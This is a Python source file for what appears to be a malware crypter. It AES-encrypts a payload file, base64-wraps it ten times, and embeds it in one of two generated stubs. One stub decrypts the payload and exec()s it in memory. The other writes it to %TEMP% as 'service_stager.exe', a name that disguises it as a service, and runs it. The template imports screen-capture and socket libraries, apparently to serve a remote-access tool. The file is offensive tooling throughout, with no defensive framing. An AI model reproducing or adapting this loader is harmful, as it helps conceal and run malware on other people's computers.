import base64
from utils import encrypt_file
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('file_path')
parser.add_argument('--stage', action='store_true', help= 'use the stager template to generate the stager')
args = parser.parse_args()

TEMPLATE = """import base64
import requests
import time
import socket
import subprocess
import threading
import os
import mss
import numpy
import cv2
import zlib
import stun
from random import randint
from Cryptodome.Cipher import AES


def unpad(data):
    padding_length = data[-1]
    if padding_length < 1 or padding_length > 16:
        raise ValueError('Invalid padding encountered')
    return data[:-padding_length]


def decrypt_file(key, iv, input_bytes):
    try:
        decoded_key = bytes.fromhex(key)
        iv_bytes = bytes.fromhex(iv)
        if len(decoded_key) != 32:
            raise ValueError('Incorrect AES key length')
        cipher = AES.new(decoded_key, AES.MODE_CBC, iv_bytes)
        decrypted_data = unpad(cipher.decrypt(input_bytes))
        return decrypted_data
    except Exception as e:
        print(f'An error occurred during decryption: {e}')
        return None


if __name__ == '__main__':
    var = <x2encipher>
    key = '<key>'
    iv = '<iv>'
    for _ in range(10):
        var = base64.b64decode(var)
    od = decrypt_file(key, iv, bytes(var))
    exec(od)

"""

STAGER_TEMPLATE = """import base64
import requests
import time
import socket
import subprocess
import threading
import os
import mss
import numpy
import cv2
import zlib
from Cryptodome.Cipher import AES


def unpad(data):
    padding_length = data[-1]
    if padding_length < 1 or padding_length > 16:
        raise ValueError('Invalid padding encountered')
    return data[:-padding_length]


def decrypt_file(key, iv, input_bytes):
    try:
        decoded_key = bytes.fromhex(key)
        iv_bytes = bytes.fromhex(iv)
        if len(decoded_key) != 32:
            raise ValueError('Incorrect AES key length')
        cipher = AES.new(decoded_key, AES.MODE_CBC, iv_bytes)
        decrypted_data = unpad(cipher.decrypt(input_bytes))
        return decrypted_data
    except Exception as e:
        print(f'An error occurred during decryption: {e}')
        return None


if __name__ == '__main__':
    var = <x2encipher>
    key = '<key>'
    iv = '<iv>'
    for _ in range(10):
        var = base64.b64decode(var)
    od = decrypt_file(key, iv, bytes(var))
    path = os.path.expandvars('%TEMP%')+r'\\service_stager.exe'
    if not os.path.exists(path):
        with open(path, 'wb') as f:
            f.write(od)
    subprocess.Popen(path, shell=True)
"""

if __name__ == '__main__':
    key, iv, ciphertext = encrypt_file(args.file_path)
    for _ in range(10):
        ciphertext = base64.b64encode(ciphertext)
    if args.stage is True:
        name = 'stager.py'
        template = STAGER_TEMPLATE
    else:
        name = 'stub.py'
        template = TEMPLATE
    template = template.replace('<x2encipher>', str(ciphertext))
    template = template.replace('<key>', key)
    template = template.replace('<iv>', iv)
    with open(name, 'w') as f:
        f.write(template)
